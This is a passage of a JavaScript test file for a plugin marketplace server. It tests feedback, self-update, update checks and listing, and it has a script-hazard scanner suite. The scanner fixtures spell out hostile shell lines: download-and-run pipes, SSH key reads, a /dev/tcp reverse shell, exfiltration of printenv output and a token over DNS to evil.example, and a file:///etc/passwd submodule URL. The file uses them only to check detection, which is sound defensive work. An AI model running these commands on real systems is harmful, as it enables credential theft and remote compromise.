        // 审查 S1：feedback/token 等写端点升级 isWriteAllowed 后需回环 socket
        socket: { remoteAddress: "127.0.0.1" },
        url: "/api/marketplace/feedback",
        [Symbol.asyncIterator]() {
          return { next: async () => sent ? { value: undefined, done: true } : (sent = true, { value: Buffer.from(bodyStr), done: false }) };
        },
      };
      let s = 0, b = null;
      await handler(req, { writeHead: (x) => { s = x; }, end: (x) => { try { b = JSON.parse(x); } catch { b = null; } } });
      return { s, b };
    };
    // 保存 token
    let r = await fbCall(fbToken, { token: "ghp_fake-token" });
    check("feedback token 保存 hasToken", r.b && r.b.hasToken, true);
    // 422 路径返回 manualUrl——手动预填链接不带日志（URL 长度限制 + 额外暴露面）
    const orig422 = mockFetch({}, 422);
    r = await fbCall(fbSubmit, { repo: "none/feedback-repo", ok: true, note: "x" });
    globalThis.fetch = orig422;
    check("feedback 422 重试后 manualUrl", typeof (r.b && r.b.manualUrl) === "string", true);
    check("feedback 422 重试后 error 含 422", r.b && r.b.error && r.b.error.includes("422"), true);
    check("manualUrl 不含日志快照（URL 暴露面）", decodeURIComponent(r.b.manualUrl).includes("安装日志（已脱敏测试样本）"), false);
    // 提交：fetch 返回 200 + html_url → 自动创建成功 → issueUrl
    // 捕获请求体断言模板渲染（异常反馈带 details 折叠日志 + 双语标记；正常反馈零日志）。
    // 先经 queueFeedback 入队带快照的 entry（对齐真实链路：安装时入队 → 反馈时取出）。
    await lib.queueFeedback({
      repo: "none/feedback-repo2", name: "fb-pkg", type: "cordis-plugin", version: "1.0.0",
      installedAt: Date.now(),
      method: "market-direct",
      reinstall: true,
      envProfile: { platform: "win32", node: "v22.0.0", market: "1.5.5", dsh: "0.1.0-rc.8", pnpm: "9.15.0", git: "2.45.0" },
      logSnapshot: "安装日志（已脱敏测试样本）",
    });
    const cap = mockFetchCapture({ html_url: "https://github.com/bradeGithub/DSH-Plugins-Marketplace/issues/1" }, 200);
    r = await fbCall(fbSubmit, { repo: "none/feedback-repo2", ok: false, note: "y" });
    globalThis.fetch = cap.orig;
    check("feedback 自动建 issue 200", r.s, 200);
    check("feedback issueUrl", r.b && r.b.issueUrl, "https://github.com/bradeGithub/DSH-Plugins-Marketplace/issues/1");
    const issueBody = cap.bodies?.[0]?.body ?? "";
    check("issue body 异常带 details 折叠", issueBody.includes("<details>") && issueBody.includes("安装日志（已脱敏测试样本）"), true);
    check("issue body 双语标题", issueBody.includes("安装反馈 / Install Feedback"), true);
    check("issue body 带环境画像", issueBody.includes("win32") && issueBody.includes("v22.0.0"), true);
    // S3 字段增补：method/reinstall/扩展画像
    check("issue body 安装方式", issueBody.includes("market-direct"), true);
    check("issue body 重装标志", issueBody.includes("重装 / Reinstall | yes"), true);
    check("issue body DSH 版本", issueBody.includes("DSH 0.1.0-rc.8"), true);
    check("issue body pnpm/git 可用性", issueBody.includes("pnpm 9.15.0") && issueBody.includes("git 2.45.0"), true);
    check("issue 异常带 install-failed label", JSON.stringify(cap.bodies?.[0]?.labels ?? []).includes("install-failed"), true);
    // 正常反馈：不带日志（噪音源头掐掉）
    await lib.queueFeedback({
      repo: "none/feedback-repo3", name: "fb-pkg-ok", type: "skill", version: "2.0.0",
      installedAt: Date.now(),
      envProfile: { platform: "linux", node: "v22.0.0", market: "1.5.5" },
      logSnapshot: "不应出现",
    });
    const capOk = mockFetchCapture({ html_url: "https://github.com/bradeGithub/DSH-Plugins-Marketplace/issues/2" }, 200);
    r = await fbCall(fbSubmit, { repo: "none/feedback-repo3", ok: true, note: "" });
    globalThis.fetch = capOk.orig;
    check("feedback 正常反馈 200", r.s, 200);
    const okBody = capOk.bodies?.[0]?.body ?? "";
    check("issue body 正常反馈零日志", okBody.includes("不应出现"), false);
    check("issue body 正常反馈带画像", okBody.includes("linux"), true);

    // queueFeedbackSafe 容错：feedback.json 只读 → 吞错 + 日志提示（安装流不受影响）
    {
      const fbFile = join(process.env.DSH_HOME, "marketplace", "feedback.json");
      chmodSync(fbFile, 0o444);
      const logLines = [];
      await lib.queueFeedbackSafe({ repo: "x/readonly", name: "x", installedAt: 1 }, (l) => logLines.push(l), "zh");
      chmodSync(fbFile, 0o644);
      check("queueFeedbackSafe 失败吞错不抛", true, true);
      check("queueFeedbackSafe 失败日志提示", logLines.some((l) => l.includes("反馈队列写入失败")), true);
    }
    // 清除 token
    r = await fbCall(fbToken, { token: "" });
    check("feedback token 清除", r.b && r.b.hasToken, false);
  } else {
    check("feedback handler 存在", false, true);
  }

  // ---- self-update POST：执行更新（v1.4.7 一键更新）——mock 同版本 → no-update 路径 ----
  // 版本更高才走真实 git clone + 原子替换本体（测试环境不触发，避免污染工作区）。
  const selfUpdateHandler = registered.find((h) => h.path === "/api/marketplace/self-update")?.handler;
  if (selfUpdateHandler) {
    const ownVersion = JSON.parse(readFileSync(join(dirname(fileURLToPath(import.meta.url)), "..", "..", "..", "package.json"), "utf8")).version;
    const suCall = async (method) => {
      let s = 0, b = null;
      await selfUpdateHandler({ method, headers: { "x-dsh-marketplace": "1", host: "127.0.0.1:3080" }, socket: { remoteAddress: "127.0.0.1" }, url: "/api/marketplace/self-update" },
        { writeHead: (x) => { s = x; }, end: (x) => { try { b = JSON.parse(x); } catch { b = null; } } });
      return { s, b };
    };
    // mock 远端与本地同版本 → compareVersions >= 0 → no-update（不 clone 不替换）
    const origSu = mockFetch({ version: ownVersion });
    let r = await suCall("POST");
    globalThis.fetch = origSu;
    check("self-update POST 同版本 200", r.s, 200);
    check("self-update POST no-update", r.b && r.b.status, "no-update");
    // 非 GET/POST → 405
    r = await suCall("DELETE");
    check("self-update DELETE 405", r.s, 405);

    // ---- Issue #46 复现：Windows 上 dshCli(.cmd) 存在时 execFile 直接启动 → spawn EINVAL ----
    // 标准 npm 全局布局（%APPDATA%\npm\dsh.cmd）存在 → 走 execFileAsync(dshCli)——
    // Node 的 execFile 无法直接启动 .cmd 批处理（无 shell 参与，spawn EINVAL）。
    // 修复：.cmd 经 cmd.exe /c 启动（路径独立参数，Node 自动引号——兼容含空格路径；
    // 不能用 /d /s 修饰符，/s 引号剥离会把路径引号剥掉）。执行成功后才走到版本验证
    // （无真实更新 → verification failed），错误消息不再是 EINVAL。
    if (process.platform === "win32") {
      const savedAppData = process.env.APPDATA;
      // 目录名含空格（模拟 APPDATA 含空格用户名的 Windows 布局）
      const fakeAppData = mkdtempSync(join(tmpdir(), "dsh supd appdata-"));
      try {
        mkdirSync(join(fakeAppData, "npm"), { recursive: true });
        writeFileSync(join(fakeAppData, "npm", "dsh.cmd"), "@echo off\r\nexit /b 0\r\n", "utf8");
        process.env.APPDATA = fakeAppData;
        const origSu2 = mockFetch({ version: "99.0.0" }); // 远高于本地 → 走执行更新路径
        let r2 = await suCall("POST");
        globalThis.fetch = origSu2;
        check("self-update Windows dsh.cmd 经 cmd.exe 启动（无 EINVAL，含空格路径）",
          r2.b?.status === "failed" && !/EINVAL/.test(r2.b?.error ?? ""), true);
        check("self-update Windows 执行路径走到版本验证", /verification failed/.test(r2.b?.error ?? ""), true);
      } finally {
        if (savedAppData !== undefined) process.env.APPDATA = savedAppData; else delete process.env.APPDATA;
        rmSync(fakeAppData, { recursive: true, force: true });
      }
    }

    // ---- else-if 分支：Windows 自定义 npm prefix（APPDATA 无 dsh.cmd）→ cmd /c 解析 PATH ----
    // 与 #46 场景互斥（dshCli 不存在）；PATH 前置 stub dsh（exit 0）→ 执行成功走到
    // 版本验证（verification failed），错误不再是 ENOENT/命令不存在。
    if (process.platform === "win32") {
      const savedAppData = process.env.APPDATA;
      const savedPath = process.env.PATH;
      const fakeAppData = mkdtempSync(join(tmpdir(), "dsh-supd-nopath-"));
      const stubDir = mkdtempSync(join(tmpdir(), "dsh-supd-stub-"));
      try {
        process.env.APPDATA = fakeAppData; // 不含 npm/dsh.cmd
        writeFileSync(join(stubDir, "dsh.cmd"), "@echo off\r\nexit /b 0\r\n", "utf8");
        process.env.PATH = `${stubDir};${savedPath ?? ""}`;
        const origSu3 = mockFetch({ version: "99.0.0" });
        let r3 = await suCall("POST");
        globalThis.fetch = origSu3;
        check("self-update PATH 回退分支经 cmd /c 启动（无 ENOENT）",
          r3.b?.status === "failed" && !/ENOENT|不是内部或外部命令/.test(r3.b?.error ?? ""), true);
        check("self-update PATH 回退分支走到版本验证", /verification failed/.test(r3.b?.error ?? ""), true);
      } finally {
        if (savedAppData !== undefined) process.env.APPDATA = savedAppData; else delete process.env.APPDATA;
        if (savedPath !== undefined) process.env.PATH = savedPath; else delete process.env.PATH;
        rmSync(fakeAppData, { recursive: true, force: true });
        rmSync(stubDir, { recursive: true, force: true });
      }
    }

    // 审查 T1（上游）：mock 远端更高版本 → 走真实 doSelfUpdate 执行路径（CLI 安装）——
    // 测试环境无 dsh CLI（Linux ENOENT / Windows 无 APPDATA 的 dsh.cmd），
    // CLI 失败或版本未变都会如实上报 500 failed，而非静默成功。
    // 前置 stub git：v1.5.1 起 CLI 失败会回退 doSelfUpdateByClone（真实 git clone +
    // 原子替换本体目录——测试里会把开发仓库替换成克隆产物！），stub 让 clone 立即失败，
    // 断言维持「执行失败如实上报 500」。
    {
      const gitStub = mkdtempSync(join(tmpdir(), "dsh-git-stub-"));
      writeFileSync(join(gitStub, process.platform === "win32" ? "git.cmd" : "git"),
        process.platform === "win32" ? "@echo off\r\nexit /b 1\r\n" : "#!/bin/sh\nexit 1\n", "utf8");
      if (process.platform !== "win32") chmodSync(join(gitStub, "git"), 0o755);
      const savedPath = process.env.PATH;
      process.env.PATH = `${gitStub}${process.platform === "win32" ? ";" : ":"}${savedPath ?? ""}`;
      try {
        const origSuHigh = mockFetch({ version: "999.0.0" });
        r = await suCall("POST");
        globalThis.fetch = origSuHigh;
      } finally {
        process.env.PATH = savedPath;
        rmSync(gitStub, { recursive: true, force: true });
      }
      check("self-update POST 更高版本走执行路径", r.s, 500);
      check("self-update POST 执行失败如实上报", r.b && r.b.status, "failed");
    }
  } else {
    check("self-update handler 存在", false, true);
  }

  // ---- check-update handler：npm 型 cli 安装的版本检测（v1.4.10/1.4.11 自更新根治）----
  // 覆盖 fetchNpmLatest（npmmirror→npmjs 双源）与 handler 各分支。
  const cuHandler = registered.find((h) => h.path === "/api/marketplace/check-update")?.handler;
  if (cuHandler) {
    const cuCall = async (method, bodyObj) => {
      const bodyStr = JSON.stringify(bodyObj ?? {});
      let sent = false;
      const req = {
        method,
        headers: { "x-dsh-marketplace": "1", host: "127.0.0.1:3080" },
        url: "/api/marketplace/check-update",
        [Symbol.asyncIterator]() {
          return { next: async () => sent ? { value: undefined, done: true } : (sent = true, { value: Buffer.from(bodyStr), done: false }) };
        },
      };
      let s = 0, b = null;
      await cuHandler(req, { writeHead: (x) => { s = x; }, end: (x) => { try { b = JSON.parse(x); } catch { b = null; } } });
      return { s, b };
    };
    // 405 / 400 badRepo / 404 无记录
    let r = await cuCall("GET");
    check("check-update 非 POST 405", r.s, 405);
    r = await cuCall("POST", { repo: "not-a-repo" });
    check("check-update badRepo 400", r.s, 400);
    r = await cuCall("POST", { repo: "none/not-installed" });
    check("check-update 无记录 404", r.s, 404);
    // 成功：已装 1.0.0（预写 PROFILE_NM）vs npm latest 2.0.0 → updateAvailable true
    const origOk = mockFetch({ "dist-tags": { latest: "2.0.0" } });
    r = await cuCall("POST", { repo: "none/cli-pkg" });
    globalThis.fetch = origOk;
    check("check-update 成功 200", r.s, 200);
    check("check-update latest 2.0.0", r.b && r.b.latestVersion, "2.0.0");
    check("check-update updateAvailable", r.b && r.b.updateAvailable, true);
    // npm 源全失败 → checkUpdateNpmFail（200 + updateAvailable false）
    const origFail = mockFetch({}, 500);
    r = await cuCall("POST", { repo: "none/cli-pkg" });
    globalThis.fetch = origFail;
    check("check-update npm 失败 status=done", r.b && r.b.status, "done");
    check("check-update npm 失败 updateAvailable false", r.b && r.b.updateAvailable, false);
    // fetchNpmLatest：按 URL 分派（双查取新——npmjs 官方优先，npmmirror 兜底）
    const npmRes = (latest) => ({
      ok: true, status: 200, headers: { get: () => null },
      json: async () => ({ "dist-tags": { latest } }), text: async () => "{}",
      arrayBuffer: async () => Buffer.from(JSON.stringify({ "dist-tags": { latest } })),
    });
    const npmFail = () => ({ ok: false, status: 500, headers: { get: () => null }, json: async () => ({}), text: async () => "{}" });
    const mockNpmByUrl = (npmjs, mirror) => {
      const orig = globalThis.fetch;
      globalThis.fetch = async (url) => (String(url).includes("npmjs.org") ? npmjs() : mirror());
      return orig;
    };
    // 官方失败 → 镜像兜底（可达性）
    let origSeq = mockNpmByUrl(npmFail, () => npmRes("3.0.0"));
    r = await cuCall("POST", { repo: "none/cli-pkg" });
    globalThis.fetch = origSeq;
    check("check-update 官方失败镜像兜底", r.b && r.b.latestVersion, "3.0.0");
    // 镜像滞后（npmmirror 同步滞后/大包卡同步）→ 取官方新版（2.0.0 > 1.0.0）
    origSeq = mockNpmByUrl(() => npmRes("2.0.0"), () => npmRes("1.0.0"));
    r = await cuCall("POST", { repo: "none/cli-pkg" });
    globalThis.fetch = origSeq;
    check("check-update 镜像滞后取官方新版（双查取新）", r.b && r.b.latestVersion, "2.0.0");
  } else {
    check("check-update handler 存在", false, true);
  }

  // ---- list handler：触发并发 worker 闭包 + pkg 冲突消解 + 已安装置顶排序 ----
  // 造一个 skills/<slug> 目录让 o/a 命中 detectInstalled 目录启发式（已安装）。
  mkdirSync(join(process.env.DSH_HOME, "skills", "a"), { recursive: true });
  const mkRepo = (full_name, name, over = {}) => ({
    full_name, name, stargazers_count: 0, html_url: `https://github.com/${full_name}`,
    updated_at: "2026-01-01T00:00:00Z", description: "x", topics: [], license: null,
    default_branch: "main", has_skill: null, has_install_script: null, ...over,
  });
  const repos4 = [
    mkRepo("o/a", "a", { pkg_name: "shared-pkg", stargazers_count: 5, has_skill: false }),
    mkRepo("o/b", "b", { pkg_name: "shared-pkg", stargazers_count: 50, has_skill: true }),
    mkRepo("o/c", "c", { pkg_name: "shared-pkg2", stargazers_count: 3, has_skill: null }),
    mkRepo("o/d", "d", { pkg_name: "shared-pkg2", stargazers_count: 30, has_skill: true }),
    // cliNpmForm 场景：合法 npm 包名（读 demo-npm-pkg/package.json → 1.0.0）与
    // 非法形态（../ 穿越 → 防御分支拒绝，installedVersion null）；has_skill:false
    // 让它们不进 skills 栏目（skills 断言按 has_skill!==false 过滤，互不干扰）
    mkRepo("none/cli-pkg", "cli-pkg", { npm_version: "2.0.0", has_skill: false }),
    mkRepo("none/cli-evil", "cli-evil", { has_skill: false }),
  ];
  const listHandler = registered.find((h) => h.path === "/api/marketplace/list")?.handler;
  if (listHandler) {
    // 按 URL 分流 mock：list 主链路走 registry 源（repos 形态）；内部 loadOfficialPackages
    // 枚举失败回退的搜索 API 给空 items 快速终止（单一形态 mock 会让搜索兜底把 registry
    // 响应当空页慢速翻页——coverage 慢速环境实测拖到超时）。
    const origList = (() => {
      const orig = globalThis.fetch;
      globalThis.fetch = async (url) => {
        const u = String(url ?? "");
        if (u.includes("/search/") || u.includes("api.github.com/search")) {
          return { ok: true, status: 200, json: async () => ({ items: [], total_count: 0 }), text: async () => JSON.stringify({ items: [], total_count: 0 }), arrayBuffer: async () => Buffer.from("{\"items\":[]}") };
        }
        return {
          ok: true, status: 200,
          json: async () => ({ repos: repos4, generated_at: new Date().toISOString() }),
          text: async () => JSON.stringify({ repos: repos4, generated_at: new Date().toISOString() }),
          arrayBuffer: async () => Buffer.from(JSON.stringify({ repos: repos4 })),
        };
      };
      return orig;
    })();
    let listStatus = 0;
    let listBody = null;
    await listHandler({ method: "GET", headers: { "x-dsh-marketplace": "1", host: "127.0.0.1:3080" }, url: "/api/marketplace/list?refresh=1" },
      { writeHead: (s) => { listStatus = s; }, end: (b) => { try { listBody = JSON.parse(b); } catch { listBody = null; } } });
    globalThis.fetch = origList;
    check("list worker 标注 200", listStatus, 200);
    // 注：响应会叠加适配层（adaptor.json）补入的真实条目（如 yejiming/dsh-museai-tavern），
    // 断言按 mock 前缀 o/ 过滤，与适配层内容解耦。
    const mockRepos = listBody && listBody.repos.filter((r) => r.full_name.startsWith("o/"));
    check("list worker 已安装置顶 + 冲突保留", mockRepos && mockRepos.map((r) => r.full_name), ["o/a", "o/d"]);
    check("list worker installed 标注", mockRepos && mockRepos.map((r) => r.installed), [true, false]);
    check("list worker updateAvailable 布尔", listBody && typeof listBody.repos[0].updateAvailable, "boolean");
    // cliNpmForm 防御分支行为：合法 npm 包名读已装版本；../ 穿越形态拒绝（null）
    const cliPkg = listBody && listBody.repos.find((r) => r.full_name === "none/cli-pkg");
    check("cliNpmForm 合法形态读已装版本", cliPkg && cliPkg.installedVersion, "1.0.0");
    check("cliNpmForm 合法形态标记 cliNpm", cliPkg && cliPkg.cliNpm, true);
    const cliEvil = listBody && listBody.repos.find((r) => r.full_name === "none/cli-evil");
    check("cliNpmForm 非法形态拒绝（穿越防御）", cliEvil && cliEvil.installedVersion, null);
  } else {
    check("list handler 存在", false, true);
  }

  // ---- skills handler：过滤 has_skill!==false + 已安装标注 + 排序 ----
  const skillsHandler = registered.find((h) => h.path === "/api/marketplace/skills")?.handler;
  if (skillsHandler) {
    const origSkills = mockFetch({ repos: repos4, generated_at: new Date().toISOString() });
    let skillsStatus = 0;
    let skillsBody = null;
    await skillsHandler({ method: "GET", headers: { "x-dsh-marketplace": "1", host: "127.0.0.1:3080" }, url: "/api/marketplace/skills?refresh=1" },
      { writeHead: (s) => { skillsStatus = s; }, end: (b) => { try { skillsBody = JSON.parse(b); } catch { skillsBody = null; } } });
    globalThis.fetch = origSkills;
    check("skills 过滤 200", skillsStatus, 200);
    check("skills 过滤 has_skill!==false + 冲突保留", skillsBody && skillsBody.repos.map((r) => r.full_name), ["o/b", "o/d"]);
    check("skills filtered 计数", skillsBody && skillsBody.filtered, 3);
  } else {
    check("skills handler 存在", false, true);
  }

  // ---- L7：safeAssign 防原型污染（执行行为）----
  const polluted = JSON.parse('{"__proto__": {"polluted": true}, "a": 1}');
  const merged = lib.safeAssign({}, polluted, { b: 2 });
  check("safeAssign 剔除 __proto__ 键", Object.prototype.polluted, undefined);
  check("safeAssign 保留正常字段", merged.a, 1);
  check("safeAssign 合并后续源", merged.b, 2);
  // 注意：用 Object.hasOwn（own property）——`in` 会命中继承的 Object.prototype.constructor
  check("safeAssign 剔除 constructor（own 检查）", Object.hasOwn(lib.safeAssign({}, JSON.parse('{"constructor": {"x": 1}}')), "constructor"), false);
  check("safeAssign 剔除 prototype（own 检查）", Object.hasOwn(lib.safeAssign({}, JSON.parse('{"prototype": {"x": 1}}')), "prototype"), false);

  // ---- L6：fetchRegistryRepos 对超大 Content-Length 弃用该源 ----
  {
    const orig6 = globalThis.fetch;
    globalThis.fetch = async () => ({
      ok: true, status: 200,
      headers: { get: (k) => (k === "content-length" ? String(64 * 1024 * 1024) : null) },
      json: async () => ({ repos: [{ full_name: "huge/source", name: "source" }] }),
      text: async () => "",
    });
    const registry = await lib.fetchRegistryRepos("dsh");
    globalThis.fetch = orig6;
    check("registry 超限响应弃用（返回 null 走下一级）", registry, null);
  }

  // ---- 适配层（adaptor.json 硬编码重定向）----
  check("adaptorRedirectRepo MuseAI → tavern", lib.adaptorRedirectRepo("yejiming/MuseAI"), "yejiming/dsh-museai-tavern");
  check("adaptorRedirectRepo 无关仓库 null", lib.adaptorRedirectRepo("some/other"), null);
  check("adaptorRedirectRepo 空值 null", lib.adaptorRedirectRepo(null), null);
  const adapted = lib.applyAdaptorList([
    { full_name: "yejiming/MuseAI", name: "MuseAI" },
    { full_name: "a/b", name: "b" }
  ]);
  check("applyAdaptorList 移除错误条目", adapted.some((r) => r.full_name === "yejiming/MuseAI"), false);
  check("applyAdaptorList 补入真实条目", adapted.some((r) => r.full_name === "yejiming/dsh-museai-tavern"), true);
  check("applyAdaptorList 保留无关条目", adapted.some((r) => r.full_name === "a/b"), true);
  check("applyAdaptorList 非数组原样返回", lib.applyAdaptorList(null), null);

  // ---- readBundledIndex（#12）：随包内置索引可读、去重、排除本体 ----
  {
    const bundled = await lib.readBundledIndex("dsh");
    check("readBundledIndex dsh 非空", Array.isArray(bundled) && bundled.length > 100, true);
    check("readBundledIndex 排除本体", bundled.some((r) => r.name === "deepseek-harness"), false);
    const names = bundled.map((r) => r.full_name);
    check("readBundledIndex 去重", new Set(names).size === names.length, true);
    const bundledSkills = await lib.readBundledIndex("skills");
    check("readBundledIndex skills 非空", Array.isArray(bundledSkills) && bundledSkills.length > 1000, true);
  }

  // ==================== #10 / #11 回归 ====================
  // ---- parseGitmodulesUrls（纯函数）：https 与相对路径放行，file:// / git@ / git:// 拒绝 ----
  {
    const gm = '[submodule "a"]\n\tpath = upstream/a\n\turl = https://github.com/o/a.git\n'
      + '[submodule "b"]\n\tpath = upstream/b\n\turl = ../b.git\n';
    const ok = lib.parseGitmodulesUrls(gm);
    check("gitmodules https+相对路径 urls", ok.urls.length, 2);
    check("gitmodules https+相对路径 unsafe 为空", ok.unsafe, []);
    const bad = lib.parseGitmodulesUrls('[submodule "x"]\n\turl = file:///etc/passwd\n[submodule "y"]\n\turl = git@github.com:o/y.git\n');
    check("gitmodules file/git@ 被拒绝", bad.unsafe, ["file:///etc/passwd", "git@github.com:o/y.git"]);
    check("gitmodules 空文本", lib.parseGitmodulesUrls(""), { urls: [], unsafe: [] });
    check("gitmodules null 入参", lib.parseGitmodulesUrls(null), { urls: [], unsafe: [] });
  }

  // ---- detectType 分层判定 + findSkillRoots vendored 跳过（#11 fixture 回归）----
  const dtBase = join(process.env.DSH_HOME, "detecttype-fixtures");
  const mkFixture = (name, files) => {
    const root = join(dtBase, name);
    for (const [rel, content] of Object.entries(files)) {
      const f = join(root, rel);
      mkdirSync(dirname(f), { recursive: true });
      writeFileSync(f, content, "utf8");
    }
    return root;
  };
  const DSH_PLUGIN_PKG = JSON.stringify({ name: "demo", version: "1.0.0", dsh: { client: { platform: "web", inject: [], immediately: true } } });
  // 1. 插件仓库 + vendored 子模块里的上游技能（oh-dsh 形态）→ cordis-plugin（修复前误判 skill）
  check("detectType 插件+vendored技能 → cordis-plugin",
    await lib.detectType(mkFixture("oh-dsh-like", {
      "package.json": DSH_PLUGIN_PKG,
      "upstream/dsh-tui/skills/audit/SKILL.md": "---\nname: audit\n---\n",
      "upstream/dsh-tui/skills/review/SKILL.md": "---\nname: review\n---\n"
    })), "cordis-plugin");
  // 2. 纯 skill 仓库带工具链 package.json（无 dsh 声明）→ skill（分层判定不能翻转为插件）
  check("detectType skill+工具package.json → skill",
    await lib.detectType(mkFixture("skill-with-tooling", {
      "package.json": JSON.stringify({ name: "skill-docs", scripts: { lint: "echo ok" } }),
      "SKILL.md": "---\nname: my-skill\n---\n"
    })), "skill");
  // 3. 嵌套技能集合仓库（无 package.json）→ skill
  check("detectType 嵌套技能集合 → skill",
    await lib.detectType(mkFixture("skill-collection", {
      "skills/a/SKILL.md": "---\nname: a\n---\n",
      "skills/b/SKILL.md": "---\nname: b\n---\n"
    })), "skill");
  // 4. 非插件 package.json（无 SKILL.md）→ cordis-plugin（保留非插件确认弹窗路径）
  check("detectType 非插件package.json → cordis-plugin",
    await lib.detectType(mkFixture("plain-npm", {
      "package.json": JSON.stringify({ name: "plain-project" })
    })), "cordis-plugin");
  // 5. 皮肤/多包仓库（根无清单，子目录有插件清单）→ cordis-plugin（原行为保留）
  check("detectType 皮肤多包 → cordis-plugin",
    await lib.detectType(mkFixture("skins-like", {
      "skins/dark/package.json": DSH_PLUGIN_PKG,
      "README.md": "# skins"
    })), "cordis-plugin");
  // 6. 仅 vendored 目录含 SKILL.md（无 package.json）→ instructions（技能是上游的，不算本仓库内容）
  check("detectType 仅vendored技能 → instructions",
    await lib.detectType(mkFixture("vendored-only", {
      "upstream/x/SKILL.md": "---\nname: x\n---\n",
      "README.md": "# readme"
    })), "instructions");
  check("findSkillRoots 跳过 upstream/", (await lib.findSkillRoots(join(dtBase, "vendored-only"))).length, 0);
  // 7. 判定报告（detectTypeDetail）：命中特征 + 理由键随类型返回（discussion #2269 承诺项）
  const dtDeclared = await lib.detectTypeDetail(mkFixture("dt-declared", {
    "package.json": DSH_PLUGIN_PKG,
    "install.sh": "#!/bin/sh\necho hi\n"
  }));
  check("detectTypeDetail dsh 声明优先于脚本 → cordis-plugin + dshDeclared",
    [dtDeclared.type, dtDeclared.reasonKey, dtDeclared.hintKey],
    ["cordis-plugin", "detectReason.dshDeclared", "detectHint.dshDeclared"]);
  const dtPlain = await lib.detectTypeDetail(mkFixture("dt-plain-npm", {
    "package.json": JSON.stringify({ name: "plain-project" })
  }));
  check("detectTypeDetail 非插件 package.json → pkgOnly 理由",
    [dtPlain.type, dtPlain.reasonKey, dtPlain.hintKey],
    ["cordis-plugin", "detectReason.pkgOnly", "detectHint.pkgOnly"]);
  const dtNone = await lib.detectTypeDetail(mkFixture("dt-empty", {
    "README.md": "# hi"
  }));
  check("detectTypeDetail 无特征 → instructions + none 理由",
    [dtNone.type, dtNone.reasonKey, dtNone.hintKey],
    ["instructions", "detectReason.none", "detectHint.none"]);
  // 8. 脚本静态危险模式扫描（discussion #2269 承诺项；2026-08 规则集扩充：
  //    按语言分表 bash/ps1 + 共享凭据字典，语义参考 ShellCheck/PSScriptAnalyzer/
  //    Semgrep command-injection/GuardDog 启发式）
  const hazDir = join(process.env.DSH_HOME, "hazard-fixtures");
  const mkHaz = (name, content) => {
    const f = join(hazDir, name);
    mkdirSync(dirname(f), { recursive: true });
    writeFileSync(f, content, "utf8");
    return f;
  };
  const shHits = await lib.scanScriptHazards(mkHaz("evil.sh", [
    "#!/bin/sh",
    "curl -s https://evil.example/x.sh | sh",
    "cat ~/.ssh/id_rsa",
    "echo alias >> ~/.bashrc"
  ].join("\n")));
  check("scanScriptHazards sh 三类命中", shHits.map((h) => h.category),
    ["downloadExec", "credRead", "rcModify"]);
  check("scanScriptHazards 行号与内容", shHits.map((h) => [h.line, h.text]),
    [[2, "curl -s https://evil.example/x.sh | sh"], [3, "cat ~/.ssh/id_rsa"], [4, "echo alias >> ~/.bashrc"]]);
  const ps1Hits = await lib.scanScriptHazards(mkHaz("evil.ps1", [
    "irm https://x/evil.ps1 | iex",
    'setx PATH "C:\\evil;%PATH%"',
    "cmdkey /list"
  ].join("\n")));
  check("scanScriptHazards ps1 三类命中", ps1Hits.map((h) => h.category),
    ["downloadExec", "pathStartup", "credRead"]);
  // 新规则覆盖：混淆/外泄/持久化（每类抽代表）
  const shObf = await lib.scanScriptHazards(mkHaz("obf.sh", [
    "echo " + "Q2xpY2tIZXJlVG9Eb3dubG9hZE1hbHdhcmVQYXlsb2Fk" + " | base64 -d | sh"
  ].join("\n")));
  check("sh base64 管道混淆命中 obfuscation", shObf.map((h) => h.category), ["obfuscation"]);
  const shExfil = await lib.scanScriptHazards(mkHaz("exfil.sh", [
    "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
  ].join("\n")));
  check("sh 反向 shell 命中 exfil", shExfil.map((h) => h.category), ["exfil"]);
  const ps1Persist = await lib.scanScriptHazards(mkHaz("persist.ps1", [
    "__EventFilter Name=EvilFilter"
  ].join("\n")));
  check("ps1 WMI 事件订阅命中 pathStartup", ps1Persist.map((h) => h.category), ["pathStartup"]);
  const ps1Dyn = await lib.scanScriptHazards(mkHaz("dyn.ps1", [
    "Set-ExecutionPolicy Bypass -Scope Process"
  ].join("\n")));
  check("ps1 执行策略绕过命中 dynamicExec", ps1Dyn.map((h) => h.category), ["dynamicExec"]);
  check("scanScriptHazards 干净脚本无命中",
    (await lib.scanScriptHazards(mkHaz("clean.ps1", "Write-Host 'hi'\nNew-Item -Path ./out\n"))).length, 0);
  check("scanScriptHazards 文件缺失返回空", (await lib.scanScriptHazards(join(hazDir, "nope.sh"))).length, 0);
  // 组合规则（文件级两遍扫描）：单行抓不住的「信号 A + 信号 B 共现」
  const comboEnv = await lib.scanScriptHazards(mkHaz("combo-env.sh", [
    "echo env | sort",                       // env 管道（信号 a 误报候选，无外联不触发）
    'curl -d "data=$(printenv)" https://evil.example/collect'
  ].join("\n")));
  check("combo env 外泄组合命中 exfil",
    comboEnv.some((h) => h.id === "combo-env-dump-exfil" && h.category === "exfil"), true);
  check("combo env 无外联不触发", comboEnv.length, 1); // 仅 combo 一条，env|sort 不单独命中
  const comboDl = await lib.scanScriptHazards(mkHaz("combo-dl.sh", [
    "curl -o /tmp/x https://evil.example/x.exe",
    "& /tmp/x"
  ].join("\n")));
  check("combo 下载+执行命中 downloadExec",
    comboDl.some((h) => h.id === "combo-download-spawn"), true);
  const comboDns = await lib.scanScriptHazards(mkHaz("combo-dns.sh", [
    "nslookup $MYTOKEN.evil.example"
  ].join("\n")));
  check("combo DNS token 外带命中 exfil",
    comboDns.some((h) => h.id === "combo-dns-token"), true);
  // 组合规则不在无组合语义时误报（只有单信号：rc 写入命中合法，curl 行无下载执行形态）
  const comboSingle = await lib.scanScriptHazards(mkHaz("combo-single.sh", "echo alias >> ~/.bashrc\ncurl -s https://a.com/ok.sh"));
  check("combo 单信号无组合命中", comboSingle.some((h) => h.id?.startsWith("combo-")), false);
  check("combo 单信号保留单行命中", comboSingle.map((h) => h.category), ["rcModify"]);

  // 白名单降级：官方一键安装形态（raw.githubusercontent）仍报但 severity 降为 medium
  const allowHit = await lib.scanScriptHazards(mkHaz("allow.sh",
    "curl -s https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash"));
  check("白名单官方形态仍命中 downloadExec", allowHit.map((h) => h.category), ["downloadExec"]);
  check("白名单官方形态降级 medium", allowHit[0].severity, "medium");
  // 非白名单域名保持 critical
  const evilHit = await lib.scanScriptHazards(mkHaz("evil2.sh",
    "curl -s https://evil.example/x.sh | bash"));
  check("非白名单域名保持 critical", evilHit[0].severity, "critical");
